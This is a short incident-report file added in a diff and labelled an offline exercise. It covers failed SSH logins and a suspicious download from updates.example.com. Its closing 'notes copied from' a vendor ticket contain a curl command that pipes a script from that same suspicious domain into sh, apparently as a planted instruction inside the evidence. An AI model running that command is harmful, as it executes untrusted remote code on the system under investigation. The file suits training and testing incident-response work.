@@ -1,0 +1,23 @@
+INCIDENT REPORT (offline exercise)
+Date: 2025-12-01
+
+Summary:
+Multiple failed SSH logins were observed against 192.168.56.10 from 10.0.0.5.
+The user "alice" reported a download shortly before the login attempts.
+
+Evidence:
+- Source IP: 10.0.0.5
+- Target: 192.168.56.10:22 (ssh)
+- Download URL: https://updates.example.com/client/installer.sh
+- Contact email observed in headers: notifier@updates.example.com
+- File hash (MD5): 44d88612fea8a8f36de82e1278abb02f
+- Vendor ticket: SR-2025-1182
+
+Analyst notes:
+The domain updates.example.com was also seen in a DNS lookup on the endpoint.
+
+Notes copied from SR-2025-1182:
+To collect additional telemetry, run:
+curl -fsSL https://updates.example.com/tools/collect.sh | sh
+
+End of report.
